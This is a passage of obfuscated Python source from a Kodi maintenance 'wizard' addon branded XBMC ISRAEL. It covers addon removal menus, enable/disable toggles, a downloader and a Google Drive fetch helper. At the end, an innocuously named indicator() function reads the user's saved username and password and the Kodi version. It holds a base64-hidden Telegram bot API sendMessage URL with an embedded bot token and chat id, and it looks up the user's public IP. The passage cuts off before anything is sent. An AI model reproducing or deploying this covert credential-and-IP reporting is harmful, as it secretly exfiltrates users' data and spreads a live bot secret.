				O0OOOOOO0O0O000O0 .append (OO00O0O0OO00OO0O0 )#line:2976
			except :#line:2977
				pass #line:2978
	if len (O00000O0OO0O0O0OO )==0 :#line:2979
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:2980
		return #line:2981
	if KODIV >16 :#line:2982
		O00OOO0000O0000O0 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00000O0OO0O0O0OO )#line:2983
	else :#line:2984
		O00OOO0000O0000O0 =[];OOOO0OOOOO0O0OOO0 =0 #line:2985
		OO000OOO00000OOOO =["-- Click here to Continue --"]+O00000O0OO0O0O0OO #line:2986
		while not OOOO0OOOOO0O0OOO0 ==-1 :#line:2987
			OOOO0OOOOO0O0OOO0 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO000OOO00000OOOO )#line:2988
			if OOOO0OOOOO0O0OOO0 ==-1 :break #line:2989
			elif OOOO0OOOOO0O0OOO0 ==0 :break #line:2990
			else :#line:2991
				O000O0OO0O0000O0O =(OOOO0OOOOO0O0OOO0 -1 )#line:2992
				if O000O0OO0O0000O0O in O00OOO0000O0000O0 :#line:2993
					O00OOO0000O0000O0 .remove (O000O0OO0O0000O0O )#line:2994
					OO000OOO00000OOOO [OOOO0OOOOO0O0OOO0 ]=O00000O0OO0O0O0OO [O000O0OO0O0000O0O ]#line:2995
				else :#line:2996
					O00OOO0000O0000O0 .append (O000O0OO0O0000O0O )#line:2997
					OO000OOO00000OOOO [OOOO0OOOOO0O0OOO0 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O00000O0OO0O0O0OO [O000O0OO0O0000O0O ])#line:2998
	if O00OOO0000O0000O0 ==None :return #line:2999
	if len (O00OOO0000O0000O0 )>0 :#line:3000
		wiz .addonUpdates ('set')#line:3001
		for OO0OO0OOOO00O0OOO in O00OOO0000O0000O0 :#line:3002
			removeAddon (O0OOOOOO0O0O000O0 [OO0OO0OOOO00O0OOO ],O00000O0OO0O0O0OO [OO0OO0OOOO00O0OOO ],True )#line:3003
		xbmc .sleep (1000 )#line:3005
		if INSTALLMETHOD ==1 :OO0O000O0000O0O00 =1 #line:3007
		elif INSTALLMETHOD ==2 :OO0O000O0000O0O00 =0 #line:3008
		else :OO0O000O0000O0O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3009
		if OO0O000O0000O0O00 ==1 :wiz .reloadFix ('remove addon')#line:3010
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3011
def removeAddonDataMenu ():#line:3013
	if os .path .exists (ADDOND ):#line:3014
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3015
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3016
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3017
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3018
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3019
		O00OO0O00OO000O00 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3020
		for O00O00OOO0OOOO000 in sorted (O00OO0O00OO000O00 ,key =lambda O00000O00O0O000O0 :O00000O00O0O000O0 ):#line:3021
			O0O0O0O0O0OO0OO0O =O00O00OOO0OOOO000 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3022
			OOO0OOO0OO00000O0 =os .path .join (O00O00OOO0OOOO000 .replace (ADDOND ,ADDONS ),'icon.png')#line:3023
			OO0O00OOOOOOOO000 =os .path .join (O00O00OOO0OOOO000 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3024
			O00OO0O00OOOO0OO0 =O0O0O0O0O0OO0OO0O #line:3025
			OO0O00000O0OO0OOO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3026
			for OOO0000OOO00O0O0O in OO0O00000O0OO0OOO :#line:3027
				O00OO0O00OOOO0OO0 =O00OO0O00OOOO0OO0 .replace (OOO0000OOO00O0O0O ,OO0O00000O0OO0OOO [OOO0000OOO00O0O0O ])#line:3028
			if O0O0O0O0O0OO0OO0O in EXCLUDES :O00OO0O00OOOO0OO0 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O00OO0O00OOOO0OO0 #line:3029
			else :O00OO0O00OOOO0OO0 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O00OO0O00OOOO0OO0 #line:3030
			addFile (' %s'%O00OO0O00OOOO0OO0 ,'removedata',O0O0O0O0O0OO0OO0O ,icon =OOO0OOO0OO00000O0 ,fanart =OO0O00OOOOOOOO000 ,themeit =THEME2 )#line:3031
	else :#line:3032
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3033
	setView ('files','viewType')#line:3034
def enableAddons ():#line:3036
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3037
	O00O00O0OOOOO0000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3038
	OO0O0OO0O0O00OOOO =0 #line:3039
	for O000O000O0OO0OO0O in sorted (O00O00O0OOOOO0000 ,key =lambda OOO0000OOOOO000O0 :OOO0000OOOOO000O0 ):#line:3040
		OO0OOO00O00OOO00O =os .path .split (O000O000O0OO0OO0O [:-1 ])[1 ]#line:3041
		if OO0OOO00O00OOO00O in EXCLUDES :continue #line:3042
		if OO0OOO00O00OOO00O in DEFAULTPLUGINS :continue #line:3043
		OO0OO0OO0OO00OOOO =os .path .join (O000O000O0OO0OO0O ,'addon.xml')#line:3044
		if os .path .exists (OO0OO0OO0OO00OOOO ):#line:3045
			OO0O0OO0O0O00OOOO +=1 #line:3046
			O00O00O0OOOOO0000 =O000O000O0OO0OO0O .replace (ADDONS ,'')[1 :-1 ]#line:3047
			O0O0O00OOO00O000O =open (OO0OO0OO0OO00OOOO )#line:3048
			OO0OO0000OOO000O0 =O0O0O00OOO00O000O .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3049
			OO0O000000OOOO00O =wiz .parseDOM (OO0OO0000OOO000O0 ,'addon',ret ='id')#line:3050
			O0OOOO00OO00OO0OO =wiz .parseDOM (OO0OO0000OOO000O0 ,'addon',ret ='name')#line:3051
			try :#line:3052
				OOO00O00OO00000OO =OO0O000000OOOO00O [0 ]#line:3053
				OO0OOOO0000000OOO =O0OOOO00OO00OO0OO [0 ]#line:3054
			except :#line:3055
				continue #line:3056
			try :#line:3057
				OO0O0000000O000OO =xbmcaddon .Addon (id =OOO00O00OO00000OO )#line:3058
				O0OO0OOOO0OOOO0OO ="[COLOR green][Enabled][/COLOR]"#line:3059
				OO0OOOO000OO0O0O0 ="false"#line:3060
			except :#line:3061
				O0OO0OOOO0OOOO0OO ="[COLOR red][Disabled][/COLOR]"#line:3062
				OO0OOOO000OO0O0O0 ="true"#line:3063
				pass #line:3064
			O00O0000000000OOO =os .path .join (O000O000O0OO0OO0O ,'icon.png')if os .path .exists (os .path .join (O000O000O0OO0OO0O ,'icon.png'))else ICON #line:3065
			O000O0O000OO00OOO =os .path .join (O000O000O0OO0OO0O ,'fanart.jpg')if os .path .exists (os .path .join (O000O000O0OO0OO0O ,'fanart.jpg'))else FANART #line:3066
			addFile ("%s %s"%(O0OO0OOOO0OOOO0OO ,OO0OOOO0000000OOO ),'toggleaddon',O00O00O0OOOOO0000 ,OO0OOOO000OO0O0O0 ,icon =O00O0000000000OOO ,fanart =O000O0O000OO00OOO )#line:3067
			O0O0O00OOO00O000O .close ()#line:3068
	if OO0O0OO0O0O00OOOO ==0 :#line:3069
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3070
	setView ('files','viewType')#line:3071
def changeFeq ():#line:3073
	OOO00OOO0O000000O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3074
	OO0O0OOO000OO0O0O =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OOO00OOO0O000000O )#line:3075
	if not OO0O0OOO000OO0O0O ==-1 :#line:3076
		wiz .setS ('autocleanfeq',str (OO0O0OOO000OO0O0O ))#line:3077
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OOO00OOO0O000000O [OO0O0OOO000OO0O0O ]))#line:3078
def developer ():#line:3080
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3081
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3082
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3083
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3084
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3085
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3086
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3087
	setView ('files','viewType')#line:3089
def download (OOO000OOOOOOO0OO0 ,OOO0OO0OOOOO0O0OO ):#line:3094
  OO00OOO0O0O000OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3095
  OOO0OO00O00O00O0O =xbmcgui .DialogProgress ()#line:3096
  OOO0OO00O00O00O0O .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3097
  OOO00O0OO000OO0OO =os .path .join (OO00OOO0O0O000OO0 ,'isr.zip')#line:3098
  OO00000O000000OOO =urllib2 .Request (OOO000OOOOOOO0OO0 )#line:3099
  OO000OOO00O00OOOO =urllib2 .urlopen (OO00000O000000OOO )#line:3100
  OO0O0O000O00OOO00 =xbmcgui .DialogProgress ()#line:3102
  OO0O0O000O00OOO00 .create ("Downloading","Downloading "+name )#line:3103
  OO0O0O000O00OOO00 .update (0 )#line:3104
  OOO00OO0O0O0O0OO0 =OOO0OO0OOOOO0O0OO #line:3105
  O0O0OO00000000OO0 =open (OOO00O0OO000OO0OO ,'wb')#line:3106
  try :#line:3108
    O000000OO00O0OO0O =OO000OOO00O00OOOO .info ().getheader ('Content-Length').strip ()#line:3109
    O00O00O0O000OOO0O =True #line:3110
  except AttributeError :#line:3111
        O00O00O0O000OOO0O =False #line:3112
  if O00O00O0O000OOO0O :#line:3114
        O000000OO00O0OO0O =int (O000000OO00O0OO0O )#line:3115
  O0OO00O000O000OOO =0 #line:3117
  OO0O00O0OO000OO0O =time .time ()#line:3118
  while True :#line:3119
        O0OOOO000OOOO00OO =OO000OOO00O00OOOO .read (8192 )#line:3120
        if not O0OOOO000OOOO00OO :#line:3121
            sys .stdout .write ('\n')#line:3122
            break #line:3123
        O0OO00O000O000OOO +=len (O0OOOO000OOOO00OO )#line:3125
        O0O0OO00000000OO0 .write (O0OOOO000OOOO00OO )#line:3126
        if not O00O00O0O000OOO0O :#line:3128
            O000000OO00O0OO0O =O0OO00O000O000OOO #line:3129
        if OO0O0O000O00OOO00 .iscanceled ():#line:3130
           OO0O0O000O00OOO00 .close ()#line:3131
           try :#line:3132
            os .remove (OOO00O0OO000OO0OO )#line:3133
           except :#line:3134
            pass #line:3135
           break #line:3136
        OO00OOO000OO000O0 =float (O0OO00O000O000OOO )/O000000OO00O0OO0O #line:3137
        OO00OOO000OO000O0 =round (OO00OOO000OO000O0 *100 ,2 )#line:3138
        O0O0O00OOOO00OO0O =O0OO00O000O000OOO /(1024 *1024 )#line:3139
        OOO0000O000OOOO0O =O000000OO00O0OO0O /(1024 *1024 )#line:3140
        O0000O0000000OO00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O0O00OOOO00OO0O ,'teal',OOO0000O000OOOO0O )#line:3141
        if (time .time ()-OO0O00O0OO000OO0O )>0 :#line:3142
          O0O00O0OO0OO0O0OO =O0OO00O000O000OOO /(time .time ()-OO0O00O0OO000OO0O )#line:3143
          O0O00O0OO0OO0O0OO =O0O00O0OO0OO0O0OO /1024 #line:3144
        else :#line:3145
         O0O00O0OO0OO0O0OO =0 #line:3146
        O0O000OOO0OOO0OO0 ='KB'#line:3147
        if O0O00O0OO0OO0O0OO >=1024 :#line:3148
           O0O00O0OO0OO0O0OO =O0O00O0OO0OO0O0OO /1024 #line:3149
           O0O000OOO0OOO0OO0 ='MB'#line:3150
        if O0O00O0OO0OO0O0OO >0 and not OO00OOO000OO000O0 ==100 :#line:3151
            O000O0OO0000O0OO0 =(O000000OO00O0OO0O -O0OO00O000O000OOO )/O0O00O0OO0OO0O0OO #line:3152
        else :#line:3153
            O000O0OO0000O0OO0 =0 #line:3154
        O0000OOO00O00OOOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O00O0OO0OO0O0OO ,O0O000OOO0OOO0OO0 )#line:3155
        OO0O0O000O00OOO00 .update (int (OO00OOO000OO000O0 ),"Downloading "+name ,O0000O0000000OO00 ,O0000OOO00O00OOOO )#line:3157
  OOO00O0OOO0O0O00O =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3160
  O0O0OO00000000OO0 .close ()#line:3162
  extract (OOO00O0OO000OO0OO ,OOO00O0OOO0O0O00O ,OO0O0O000O00OOO00 )#line:3164
  if os .path .exists (OOO00O0OOO0O0O00O +'/scakemyer-script.quasar.burst'):#line:3165
    if os .path .exists (OOO00O0OOO0O0O00O +'/script.quasar.burst'):#line:3166
     shutil .rmtree (OOO00O0OOO0O0O00O +'/script.quasar.burst',ignore_errors =False )#line:3167
    os .rename (OOO00O0OOO0O0O00O +'/scakemyer-script.quasar.burst',OOO00O0OOO0O0O00O +'/script.quasar.burst')#line:3168
  if os .path .exists (OOO00O0OOO0O0O00O +'/plugin.video.kmediatorrent-master'):#line:3170
    if os .path .exists (OOO00O0OOO0O0O00O +'/plugin.video.kmediatorrent'):#line:3171
     shutil .rmtree (OOO00O0OOO0O0O00O +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3172
    os .rename (OOO00O0OOO0O0O00O +'/plugin.video.kmediatorrent-master',OOO00O0OOO0O0O00O +'/plugin.video.kmediatorrent')#line:3173
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3174
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3175
  try :#line:3176
    os .remove (OOO00O0OO000OO0OO )#line:3177
  except :#line:3178
    pass #line:3179
  OO0O0O000O00OOO00 .close ()#line:3180
def dis_or_enable_addon (OO000O00OO0OO00O0 ,O000OOOOOO00OOOO0 ,enable ="true"):#line:3181
    import json #line:3182
    OOOO0OOO00O000O00 ='"%s"'%OO000O00OO0OO00O0 #line:3183
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO000O00OO0OO00O0 )and enable =="true":#line:3184
        logging .warning ('already Enabled')#line:3185
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO000O00OO0OO00O0 )#line:3186
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO000O00OO0OO00O0 )and enable =="false":#line:3187
        return xbmc .log ("### Skipped %s, reason = not installed"%OO000O00OO0OO00O0 )#line:3188
    else :#line:3189
        OO000O0OOOO0000OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOOO0OOO00O000O00 ,enable )#line:3190
        OO00O000O0000O0OO =xbmc .executeJSONRPC (OO000O0OOOO0000OO )#line:3191
        OOOOO00O00000O0O0 =json .loads (OO00O000O0000O0OO )#line:3192
        if enable =="true":#line:3193
            xbmc .log ("### Enabled %s, response = %s"%(OO000O00OO0OO00O0 ,OOOOO00O00000O0O0 ))#line:3194
        else :#line:3195
            xbmc .log ("### Disabled %s, response = %s"%(OO000O00OO0OO00O0 ,OOOOO00O00000O0O0 ))#line:3196
    if O000OOOOOO00OOOO0 =='auto':#line:3197
     return True #line:3198
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3199
def chunk_report (O0OOO00O000OOOO00 ,OO0000OOO0OO0OOO0 ,O00O0O00OOO0O0000 ):#line:3200
   O0OOO00000O0OOOOO =float (O0OOO00O000OOOO00 )/O00O0O00OOO0O0000 #line:3201
   O0OOO00000O0OOOOO =round (O0OOO00000O0OOOOO *100 ,2 )#line:3202
   if O0OOO00O000OOOO00 >=O00O0O00OOO0O0000 :#line:3204
      sys .stdout .write ('\n')#line:3205
def chunk_read (O0OOO0OO0O0OO00O0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3207
   import time #line:3208
   O00O0OOO00000OO00 =int (filesize )*1000000 #line:3209
   OOOOOOOO0O00OOOO0 =0 #line:3211
   O0O00OO000O000OO0 =time .time ()#line:3212
   O00O0000O0OO00O0O =0 #line:3213
   logging .warning ('Downloading')#line:3215
   with open (destination ,"wb")as O0OO0O0OOOO00O000 :#line:3216
    while 1 :#line:3217
      OOO00OO00000OOO0O =time .time ()-O0O00OO000O000OO0 #line:3218
      O0OO0000000OOOOOO =int (O00O0000O0OO00O0O *chunk_size )#line:3219
      OO000O0O00O000OO0 =O0OOO0OO0O0OO00O0 .read (chunk_size )#line:3220
      O0OO0O0OOOO00O000 .write (OO000O0O00O000OO0 )#line:3221
      O0OO0O0OOOO00O000 .flush ()#line:3222
      OOOOOOOO0O00OOOO0 +=len (OO000O0O00O000OO0 )#line:3223
      OO0OOOO0OO00OO0O0 =float (OOOOOOOO0O00OOOO0 )/O00O0OOO00000OO00 #line:3224
      OO0OOOO0OO00OO0O0 =round (OO0OOOO0OO00OO0O0 *100 ,2 )#line:3225
      if int (OOO00OO00000OOO0O )>0 :#line:3226
        O0000OO0OO000000O =int (O0OO0000000OOOOOO /(1024 *OOO00OO00000OOO0O ))#line:3227
      else :#line:3228
         O0000OO0OO000000O =0 #line:3229
      if O0000OO0OO000000O >1024 and not OO0OOOO0OO00OO0O0 ==100 :#line:3230
          O0OO00OOOOOOOO0OO =int (((O00O0OOO00000OO00 -O0OO0000000OOOOOO )/1024 )/(O0000OO0OO000000O ))#line:3231
      else :#line:3232
          O0OO00OOOOOOOO0OO =0 #line:3233
      if O0OO00OOOOOOOO0OO <0 :#line:3234
        O0OO00OOOOOOOO0OO =0 #line:3235
      dp .update (int (OO0OOOO0OO00OO0O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO0OOOO0OO00OO0O0 ,O0OO0000000OOOOOO /(1024 *1024 ),O00O0OOO00000OO00 /(1000 *1000 ),O0000OO0OO000000O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0OO00OOOOOOOO0OO ,60 ))#line:3236
      if dp .iscanceled ():#line:3237
         dp .close ()#line:3238
         break #line:3239
      if not OO000O0O00O000OO0 :#line:3240
         break #line:3241
      if report_hook :#line:3243
         report_hook (OOOOOOOO0O00OOOO0 ,chunk_size ,O00O0OOO00000OO00 )#line:3244
      O00O0000O0OO00O0O +=1 #line:3245
   logging .warning ('END Downloading')#line:3246
   return OOOOOOOO0O00OOOO0 #line:3247
def googledrive_download (OO000OO000O0O0OO0 ,OOOOOOOO0O000O0OO ,OO0O0000O0OO00OO0 ,OO00OO0OOO0O0O000 ):#line:3249
    O000OO0O0O0O0OO0O =[]#line:3253
    OO0O0OOOOO0OO00OO =OO000OO000O0O0OO0 .split ('=')#line:3254
    OO000OO000O0O0OO0 =OO0O0OOOOO0OO00OO [len (OO0O0OOOOO0OO00OO )-1 ]#line:3255
    def O0OOO000O0OOO0O00 (OOOO000000OOOO0O0 ):#line:3257
        for OO0O00OO0OOO0OOOO in OOOO000000OOOO0O0 :#line:3259
            logging .warning ('cookie.name')#line:3260
            logging .warning (OO0O00OO0OOO0OOOO .name )#line:3261
            O0OO0O0000O0O0O00 =OO0O00OO0OOO0OOOO .value #line:3262
            if 'download_warning'in OO0O00OO0OOO0OOOO .name :#line:3263
                logging .warning (OO0O00OO0OOO0OOOO .value )#line:3264
                logging .warning ('cookie.value')#line:3265
                return OO0O00OO0OOO0OOOO .value #line:3266
            return O0OO0O0000O0O0O00 #line:3267
        return None #line:3269
    def O00OO00OOOO00OOO0 (OO0000O0OO0OOOO0O ,OO0OOO0OO0O00000O ):#line:3271
        OO0OOOOO0OOO0OOO0 =32768 #line:3273
        O000O00O00OO0O00O =time .time ()#line:3274
        with open (OO0OOO0OO0O00000O ,"wb")as O00OOOO000O0O00OO :#line:3276
            O0O0OOOOOO0OOO000 =1 #line:3277
            O0OOOO000O0O0OO0O =32768 #line:3278
            try :#line:3279
                OOOOO0OO0OOOOOOOO =int (OO0000O0OO0OOOO0O .headers .get ('content-length'))#line:3280
                print ('file total size :',OOOOO0OO0OOOOOOOO )#line:3281
            except TypeError :#line:3282
                print ('using dummy length !!!')#line:3283
                OOOOO0OO0OOOOOOOO =int (OO00OO0OOO0O0O000 )*1000000 #line:3284
            for O0O0O00000OOO00O0 in OO0000O0OO0OOOO0O .iter_content (OO0OOOOO0OOO0OOO0 ):#line:3285
                if O0O0O00000OOO00O0 :#line:3286
                    O00OOOO000O0O00OO .write (O0O0O00000OOO00O0 )#line:3287
                    O00OOOO000O0O00OO .flush ()#line:3288
                    O0O00OOOO0O000O0O =time .time ()-O000O00O00OO0O00O #line:3289
                    O00000OOOOOOO0OOO =int (O0O0OOOOOO0OOO000 *O0OOOO000O0O0OO0O )#line:3290
                    if O0O00OOOO0O000O0O ==0 :#line:3291
                        O0O00OOOO0O000O0O =0.1 #line:3292
                    O00OOOO0OOOO0OOOO =int (O00000OOOOOOO0OOO /(1024 *O0O00OOOO0O000O0O ))#line:3293
                    OO0OO000O0OO0O00O =int (O0O0OOOOOO0OOO000 *O0OOOO000O0O0OO0O *100 /OOOOO0OO0OOOOOOOO )#line:3294
                    if O00OOOO0OOOO0OOOO >1024 and not OO0OO000O0OO0O00O ==100 :#line:3295
                      OOOO0OO000OO00OO0 =int (((OOOOO0OO0OOOOOOOO -O00000OOOOOOO0OOO )/1024 )/(O00OOOO0OOOO0OOOO ))#line:3296
                    else :#line:3297
                      OOOO0OO000OO00OO0 =0 #line:3298
                    OO0O0000O0OO00OO0 .update (int (OO0OO000O0OO0O00O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO0OO000O0OO0O00O ,O00000OOOOOOO0OOO /(1024 *1024 ),OOOOO0OO0OOOOOOOO /(1000 *1000 ),O00OOOO0OOOO0OOOO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOOO0OO000OO00OO0 ,60 ))#line:3300
                    O0O0OOOOOO0OOO000 +=1 #line:3301
                    if OO0O0000O0OO00OO0 .iscanceled ():#line:3302
                     OO0O0000O0OO00OO0 .close ()#line:3303
                     break #line:3304
    OOO0OO00000000O0O ="https://docs.google.com/uc?export=download"#line:3305
    import urllib2 #line:3310
    import cookielib #line:3311
    from cookielib import CookieJar #line:3313
    O0O00O0O0OO0O0OO0 =CookieJar ()#line:3315
    O00O0OO00OO0O00OO =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0O00O0O0OO0O0OO0 ))#line:3316
    OOO0OOO00O0000OO0 ={'id':OO000OO000O0O0OO0 }#line:3318
    O000000OO0O00OO0O =urllib .urlencode (OOO0OOO00O0000OO0 )#line:3319
    logging .warning (OOO0OO00000000O0O +'&'+O000000OO0O00OO0O )#line:3320
    O0OOOOOOOO0O0O0OO =O00O0OO00OO0O00OO .open (OOO0OO00000000O0O +'&'+O000000OO0O00OO0O )#line:3321
    OOOOOO0OOOO000O0O =O0OOOOOOOO0O0O0OO .read ()#line:3322
    for OOO0OOOO000O00OOO in O0O00O0O0OO0O0OO0 :#line:3324
         logging .warning (OOO0OOOO000O00OOO )#line:3325
    OO0OOO0OO00O0OO0O =O0OOO000O0OOO0O00 (O0O00O0O0OO0O0OO0 )#line:3326
    logging .warning (OO0OOO0OO00O0OO0O )#line:3327
    if OO0OOO0OO00O0OO0O :#line:3328
        O0O0OOOOOO00OOO00 ={'id':OO000OO000O0O0OO0 ,'confirm':OO0OOO0OO00O0OO0O }#line:3329
        O0OO000OO00000000 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3330
        O000000OO0O00OO0O =urllib .urlencode (O0O0OOOOOO00OOO00 )#line:3331
        O0OOOOOOOO0O0O0OO =O00O0OO00OO0O00OO .open (OOO0OO00000000O0O +'&'+O000000OO0O00OO0O )#line:3332
        chunk_read (O0OOOOOOOO0O0O0OO ,report_hook =chunk_report ,dp =OO0O0000O0OO00OO0 ,destination =OOOOOOOO0O000O0OO ,filesize =OO00OO0OOO0O0O000 )#line:3333
    return (O000OO0O0O0O0OO0O )#line:3337
def kodi17Fix ():#line:3338
	OO0OO0OOO000O0OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3339
	O0O00O000O0OO00O0 =[]#line:3340
	for OOO0O0000OOOO00O0 in sorted (OO0OO0OOO000O0OOO ,key =lambda OOO0OO0O00OOOO00O :OOO0OO0O00OOOO00O ):#line:3341
		O0O000O0OO0OO00O0 =os .path .join (OOO0O0000OOOO00O0 ,'addon.xml')#line:3342
		if os .path .exists (O0O000O0OO0OO00O0 ):#line:3343
			O0OOO000OOOO0OOOO =OOO0O0000OOOO00O0 .replace (ADDONS ,'')[1 :-1 ]#line:3344
			O00O0000O0OOOO000 =open (O0O000O0OO0OO00O0 )#line:3345
			O0OOOO00O0000O0O0 =O00O0000O0OOOO000 .read ()#line:3346
			OO00OOOO0OOOOOO0O =parseDOM (O0OOOO00O0000O0O0 ,'addon',ret ='id')#line:3347
			O00O0000O0OOOO000 .close ()#line:3348
			try :#line:3349
				OOO0OO00OOO0O0000 =xbmcaddon .Addon (id =OO00OOOO0OOOOOO0O [0 ])#line:3350
			except :#line:3351
				try :#line:3352
					log ("%s was disabled"%OO00OOOO0OOOOOO0O [0 ],xbmc .LOGDEBUG )#line:3353
					O0O00O000O0OO00O0 .append (OO00OOOO0OOOOOO0O [0 ])#line:3354
				except :#line:3355
					try :#line:3356
						log ("%s was disabled"%O0OOO000OOOO0OOOO ,xbmc .LOGDEBUG )#line:3357
						O0O00O000O0OO00O0 .append (O0OOO000OOOO0OOOO )#line:3358
					except :#line:3359
						if len (OO00OOOO0OOOOOO0O )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0OOO000OOOO0OOOO ,xbmc .LOGERROR )#line:3360
						else :log ("Unabled to enable: %s"%OOO0O0000OOOO00O0 ,xbmc .LOGERROR )#line:3361
	if len (O0O00O000O0OO00O0 )>0 :#line:3362
		OO0O00O0OOOOO0OO0 =0 #line:3363
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3364
		for O0O000OO000OO0OO0 in O0O00O000O0OO00O0 :#line:3365
			OO0O00O0OOOOO0OO0 +=1 #line:3366
			O00O0O0OO0O0O0OOO =int (percentage (OO0O00O0OOOOO0OO0 ,len (O0O00O000O0OO00O0 )))#line:3367
			DP .update (O00O0O0OO0O0O0OOO ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O000OO000OO0OO0 ))#line:3368
			addonDatabase (O0O000OO000OO0OO0 ,1 )#line:3369
			if DP .iscanceled ():break #line:3370
		if DP .iscanceled ():#line:3371
			DP .close ()#line:3372
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3373
			sys .exit ()#line:3374
		DP .close ()#line:3375
	forceUpdate ()#line:3376
def indicator ():#line:3377
       try :#line:3378
          import json #line:3379
          wiz .log ('FRESH MESSAGE')#line:3380
          O000OO0O0OOO00000 =(ADDON .getSetting ("user"))#line:3381
          OO000000O0O0O00O0 =(ADDON .getSetting ("pass"))#line:3382
          OO00OOO0O0O0OOO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3383
          OOO0OO0OOOOOOO0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDQzMjU2NjE1MTpBQUZHaHVnX01yTFVfT2dzMGN4MEVVMWdvTnhXYzdaTm5lUS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxMTg3NTk5NjY2JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3384
          OO00OO0OO0OOOO00O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3385
          O000O0O00000O0O00 =str (json .loads (OO00OO0OO0OOOO00O )['ip'])#line:3386
